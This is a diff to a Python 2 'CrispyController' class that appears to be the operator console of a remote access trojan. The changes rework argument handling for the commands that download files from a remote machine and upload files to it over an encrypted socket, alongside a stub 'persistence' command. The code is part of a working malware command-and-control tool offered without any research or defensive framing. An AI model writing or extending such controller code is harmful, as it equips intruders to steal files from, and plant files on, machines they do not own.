@@ -92,23 +92,37 @@ class CrispyController:
                 elif cmd == "persistence":
                     print "need to implement"
                 elif cmd.startswith('download'):
-                    saveMeFile = cmd[9:].split(' ')[1]
-                    print "[-] Attempting download of " + cmd[9:].split(' ')[0] + "..."
-                    self.sock.sendall(self.cipher.encode(cmd + "\n"))
-                     
-                    if self.receiveFile(saveMeFile):      
-                        print "[+] File transfer complete!\n"
+                    args = cmd.split(' ')
+                    
+                    if len(args) == 3:
+                        if os.path.isfile(args[2]):
+                            print "[!] File already exists locally.\n"
+                        else:
+                            print "[-] Attempting download of " + args[1] + "..."
+                            self.sock.sendall(self.cipher.encode(cmd + "\n")) #should be able to just send "save to dir" not whole cmd
+                             
+                            if self.receiveFile(args[2]):      
+                                print "[+] File transfer complete!\n"
+                            else:
+                                print "[!] File transfer failed.\n"
                     else:
-                        print "[!] File transfer failed.\n"
+                        print "[!] You must include a src and dest directory e.g >> download /tmp/test.txt /Users/Crispy/test.txt \n"
                 elif cmd.startswith('upload'):
-                    sendMeFile = cmd[7:].split(' ')[0]
-                    print "[-] Attempting upload of " + sendMeFile + "..."
-                    self.sock.sendall(self.cipher.encode(cmd + "\n"))
-
-                    if self.uploadFile(sendMeFile):
-                        print "[+] File transfer complete!\n"
+                    args = cmd.split(' ')
+                    
+                    if len(args) == 3:
+                        if os.path.isfile(args[1]):
+                            print "[-] Attempting upload of " + args[1] + "..."
+                            self.sock.sendall(self.cipher.encode(cmd + "\n")) #should be able to just send "save to dir" not whole cmd
+        
+                            if self.uploadFile(args[1]):
+                                print "[+] File transfer complete!\n"
+                            else:
+                                print "[!] File transfer failed.\n"
+                        else:
+                            print "[!] File does not exist locally.\n"
                     else:
-                        print "[!] File transfer failed.\n"
+                        print "[!] You must include a src and dest directory e.g >> upload /Users/Crispy/test.txt /tmp/test.txt\n"
                 elif cmd == 'exit' or cmd == 'quit':
                     self.sock.sendall(self.cipher.encode(cmd + "\n"))
                     self.sock.close()
